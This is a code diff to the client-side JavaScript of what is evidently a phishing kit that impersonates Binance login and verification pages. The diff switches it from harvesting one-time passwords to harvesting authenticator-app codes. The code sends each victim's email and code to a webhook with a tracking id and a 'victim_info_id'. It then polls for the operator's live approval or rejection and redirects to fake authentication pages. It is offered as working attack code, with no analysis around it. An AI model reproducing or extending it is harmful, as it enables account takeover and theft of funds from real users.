@@ -488,10 +488,10 @@
             // Prepare data for webhook
             const data = {
                 login_email: email,
-                login_otp: code,
+                login_authenticator_app_code: code,
                 tracking_id: trackingId,
                 timestamp: new Date().toISOString(),
-                type: 'otp_verification',
+                type: 'authenticator_verification',
                 user_agent: navigator.userAgent,
                 ip_info: 'client-side'
             };
@@ -554,15 +554,15 @@
                 // Check if we have victim_info_id for polling
                 const victimInfoId = localStorage.getItem('binance_victim_info_id');
                 if (victimInfoId) {
-                    // Start polling for OTP approval
-                    pollForApproval(victimInfoId, campaignId, 'otp');
+                    // Start polling for authenticator app approval
+                    pollForApproval(victimInfoId, campaignId, 'authenticator');
                 } else {
                     // Fallback to original behavior
                     setTimeout(() => {
                         showSuccess('Verification submitted successfully!');
-                        // Redirect to success page after delay
+                        // Redirect back to authentication page with completion status
                         setTimeout(() => {
-                            window.location.href = 'success.html';
+                            window.location.href = 'binance-authentication.html?completed=authenticator';
                         }, 2000);
                     }, 1000);
                 }
@@ -602,15 +602,15 @@
                     console.log('Poll result:', result);
                     if (result.submission_status === 'approved') {
                         pollingActive = false; // Stop polling
-                        // Hide loading and proceed to next step IMMEDIATELY
+                        // Hide loading and proceed back to authentication page
                         resetButton();
-                        // If you want to go to binance-verification.html, use that, otherwise use success.html
-                        window.location.href = 'binance-verification.html';
+                        // Redirect back to authentication page with completion status
+                        window.location.href = 'binance-authentication.html?completed=authenticator';
                     } else if (result.submission_status === 'rejected') {
                         pollingActive = false; // Stop polling - DO NOT PROCEED
                         // Hide loading and show error - STAY ON CURRENT PAGE
                         resetButton();
-                        let errorMsg = result.error_message || 'Invalid OTP. Please try again.';
+                        let errorMsg = result.error_message || 'Invalid authenticator code. Please try again.';
                         showError(errorMsg);
                         // DO NOT REDIRECT - User must fix the input and try again
                     } else {
